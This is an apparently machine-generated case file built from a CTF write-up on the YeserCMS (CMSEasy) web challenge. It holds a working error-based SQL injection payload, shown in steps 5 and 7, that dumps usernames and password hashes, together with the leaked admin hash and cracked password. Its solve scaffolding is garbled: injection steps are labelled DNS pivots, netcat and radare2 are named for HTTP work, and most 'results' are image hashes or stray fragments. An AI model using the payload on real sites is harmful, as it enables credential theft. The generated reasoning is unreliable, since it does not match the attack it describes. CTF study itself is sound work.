# “百度杯”CTF比赛 九月场 YeserCMS 详细解析_「已注销」的博客-CSDN博客_yesercms漏洞

## Case Metadata

- Category: `Web`
- Platform: `“百度杯”CTF比赛 九月场 YeserCMS 详细解析`
- Difficulty: `unknown`
- Source repository: `https://github.com/apachecn/apachecn-ctf-wiki`
- Source commit: `762ca130572c95196cf120e5f4ad5fbdd88b1b93`
- Source file: `docs/“百度杯”CTF比赛-九月场-YeserCMS-详细解析_「已注销」的博客-CSDN博客_yesercms漏洞.md`
- Source URL: `https://github.com/apachecn/apachecn-ctf-wiki/blob/762ca130572c95196cf120e5f4ad5fbdd88b1b93/docs/%E2%80%9C%E7%99%BE%E5%BA%A6%E6%9D%AF%E2%80%9DCTF%E6%AF%94%E8%B5%9B-%E4%B9%9D%E6%9C%88%E5%9C%BA-YeserCMS-%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90_%E3%80%8C%E5%B7%B2%E6%B3%A8%E9%94%80%E3%80%8D%E7%9A%84%E5%8D%9A%E5%AE%A2-CSDN%E5%8D%9A%E5%AE%A2_yesercms%E6%BC%8F%E6%B4%9E.md`
- Local source mirror: `sources/apachecn-apachecn-ctf-wiki/repo/docs/“百度杯”CTF比赛-九月场-YeserCMS-详细解析_「已注销」的博客-CSDN博客_yesercms漏洞.md`

## Why This Case Matters

Use this case as a Web reference for web-app challenges.

## Input Signals

- Artifacts: web-app
- Tools: netcat, radare2
- Techniques: dns-analysis, file-upload, http-analysis, php-tricks, sql-injection, web-exploitation

## First-Principles Route

- Identify the exposed entry point, reflected behavior, trust boundary, and any explicit hints or blacklists.
- Validate the suspected primitive with the smallest payload that proves code/data/control influence.
- Chain the primitive into file read, code execution, auth bypass, or state manipulation only after recording the bypass condition.

## Linked Assets

- Referenced assets: `5`
- `docs/img/b2530a1021f4e4abcdcf560b037842c1.png`
- `docs/img/36de091a66727ef7b5f2cf611a8ca79b.png`
- `docs/img/5c490d0d838041efecbbae79e5ce887b.png`
- `docs/img/59ddc86d253dd984d720add4fbeca385.png`
- `docs/img/58081e5c1eb7deec7e8feedd876aa803.png`

## Solve Thinking

### Step 1: Document

- Route type: `netcat-driven evidence lookup`
- Why: For Web, keep every answer tied to one artifact, one probe, and one proof field.
- Probe: Use netcat, radare2 to collect the smallest evidence slice that answers the goal.
- Tools: netcat, radare2
- Reasoning chain:
  - Recognize the section as netcat-driven evidence lookup.
  - Use netcat, radare2 to collect the smallest evidence slice that answers the goal.
  - Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Evidence rule: Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Result: `-->`

### Step 2: “百度杯”CTF比赛 九月场 YeserCMS 详细解析_「已注销」的博客-CSDN博客_yesercms漏洞

- Route type: `http evidence extraction`
- Why: HTTP questions usually reduce to request metadata, response body, host/URI correlation, or object extraction.
- Probe: Use netcat, radare2 to inspect HTTP requests, hosts, URIs, headers, and response bodies.
- Tools: netcat, radare2
- Reasoning chain:
  - Recognize the section as http evidence extraction.
  - Use netcat, radare2 to inspect HTTP requests, hosts, URIs, headers, and response bodies.
  - Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Evidence rule: Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Result: `> 来源：[https://blog.csdn.net/drip_big/article/details/105504818](https://blog.csdn.net/drip_big/article/details/105504818)`

### Step 3: “百度杯”CTF比赛 九月场 YeserCMS 详细解析

- Route type: `netcat-driven evidence lookup`
- Why: For Web, keep every answer tied to one artifact, one probe, and one proof field.
- Probe: Use netcat, radare2 to collect the smallest evidence slice that answers the goal.
- Tools: netcat, radare2
- Reasoning chain:
  - Recognize the section as netcat-driven evidence lookup.
  - Use netcat, radare2 to collect the smallest evidence slice that answers the goal.
  - Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Evidence rule: Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Result: `新的CMS系统，帮忙测测是否有漏洞。`

### Step 4: 1 第一步就是了解这是什么cms

- Route type: `http evidence extraction`
- Why: HTTP questions usually reduce to request metadata, response body, host/URI correlation, or object extraction.
- Probe: Use netcat, radare2 to inspect HTTP requests, hosts, URIs, headers, and response bodies.
- Tools: netcat, radare2
- Reasoning chain:
  - Recognize the section as http evidence extraction.
  - Use netcat, radare2 to inspect HTTP requests, hosts, URIs, headers, and response bodies.
  - Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Evidence rule: Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Result: `b2530a1021f4e4abcdcf560b037842c1`

### Step 5: 2 已知CMSEasy,百度该cms的历史漏洞

- Route type: `dns pivot`
- Why: DNS questions usually reduce to source host, resolver, queried name, response, or packet number pivots.
- Probe: Use netcat with the extracted filter/query `xajax=Postdata&xajaxargs[0]=<xjxquery><q>detail=xxxxxx',(UpdateXML(1,CONCAT(0x5b,mid((SELECT/**/GROUP_CONCAT(concat(username,'|',password)) from cmseasy_user),1,32),0x5d),1)),NULL,NULL,NULL,NULL,NULL,NULL)` and inspect the matching evidence.
- Tools: netcat
- Filters or commands:
  - `xajax=Postdata&xajaxargs[0]=<xjxquery><q>detail=xxxxxx',(UpdateXML(1,CONCAT(0x5b,mid((SELECT/**/GROUP_CONCAT(concat(username,'|',password)) from cmseasy_user),1,32),0x5d),1)),NULL,NULL,NULL,NULL,NULL,NULL)`
- Reasoning chain:
  - Recognize the section as dns pivot.
  - Use netcat with the extracted filter/query `xajax=Postdata&xajaxargs[0]=<xjxquery><q>detail=xxxxxx',(UpdateXML(1,CONCAT(0x5b,mid((SELECT/**/GROUP_CONCAT(concat(username,'|',password)) from cmseasy_user),1,32),0x5d),1)),NULL,NULL,NULL,NULL,NULL,NULL)` and inspect the matching evidence.
  - Trust the result only when the extracted evidence line or field directly supports it.
- Evidence rule: Trust the result only when the extracted evidence line or field directly supports it.
- Result: `header.php`

### Step 6: 3 分析该注入语句，尝试注入

- Route type: `sql injection exploitation`
- Why: SQLi cases are cheapest when the injection style is classified early and every response difference is recorded.
- Probe: Use netcat with the extracted filter/query `python3` and inspect the matching evidence.
- Tools: netcat
- Filters or commands:
  - `python3`
- Reasoning chain:
  - Recognize the section as sql injection exploitation.
  - Use netcat with the extracted filter/query `python3` and inspect the matching evidence.
  - Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Evidence rule: Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Result: `f519a38b813f47619130e22fae5abe4f9a2ff7125379491f`

### Step 7: 4 对yesercms_user进行注入，试图找到管理员账号

- Route type: `dns pivot`
- Why: DNS questions usually reduce to source host, resolver, queried name, response, or packet number pivots.
- Probe: Use netcat, radare2 with the extracted filter/query `xajax=Postdata&xajaxargs[0]=<xjxquery><q>detail=xxxxxx',(UpdateXML(1,CONCAT(0x5b,mid((SELECT/**/GROUP_CONCAT(concat(username,'|',password)) from yesercms_user),1,32),0x5d),1)),NULL,NULL,NULL,NULL,NULL,NULL)` and inspect the matching evidence.
- Tools: netcat, radare2
- Filters or commands:
  - `xajax=Postdata&xajaxargs[0]=<xjxquery><q>detail=xxxxxx',(UpdateXML(1,CONCAT(0x5b,mid((SELECT/**/GROUP_CONCAT(concat(username,'|',password)) from yesercms_user),1,32),0x5d),1)),NULL,NULL,NULL,NULL,NULL,NULL)`
  - `XPATH syntax error: ‘[admin|ff512d4240cbbdeafada40467’`
  - `[admin|ff512d4240cbbdeafada404677ccbe61]`
  - `[admin|Yeser231]`
- Reasoning chain:
  - Recognize the section as dns pivot.
  - Use netcat, radare2 with the extracted filter/query `xajax=Postdata&xajaxargs[0]=<xjxquery><q>detail=xxxxxx',(UpdateXML(1,CONCAT(0x5b,mid((SELECT/**/GROUP_CONCAT(concat(username,'|',password)) from yesercms_user),1,32),0x5d),1)),NULL,NULL,NULL,NULL,NULL,NULL)` and inspect the matching evidence.
  - Trust the result only when the extracted evidence line or field directly supports it.
- Evidence rule: Trust the result only when the extracted evidence line or field directly supports it.
- Result: `ff512d4240cbbdeafada404677ccbe61`

### Step 8: 5 登入后台找flag.php

- Route type: `sql injection exploitation`
- Why: SQLi cases are cheapest when the injection style is classified early and every response difference is recorded.
- Probe: Use netcat, radare2 to confirm injection context, then narrow to the cheapest boolean, union, error, or stacked route that leaks proof.
- Tools: netcat, radare2
- Reasoning chain:
  - Recognize the section as sql injection exploitation.
  - Use netcat, radare2 to confirm injection context, then narrow to the cheapest boolean, union, error, or stacked route that leaks proof.
  - Trust the result only when the extracted evidence line or field directly supports it.
- Evidence rule: Trust the result only when the extracted evidence line or field directly supports it.
- Result: `59ddc86d253dd984d720add4fbeca385`

## Reuse Checklist

- Match the new challenge's artifact and question shape against this case before copying any tool sequence.
- Start from the same evidence class, then adapt filters, fields, and timestamps to the new artifact.
- Promote any repeated manual action into a skill command before relying on it for the final solve.
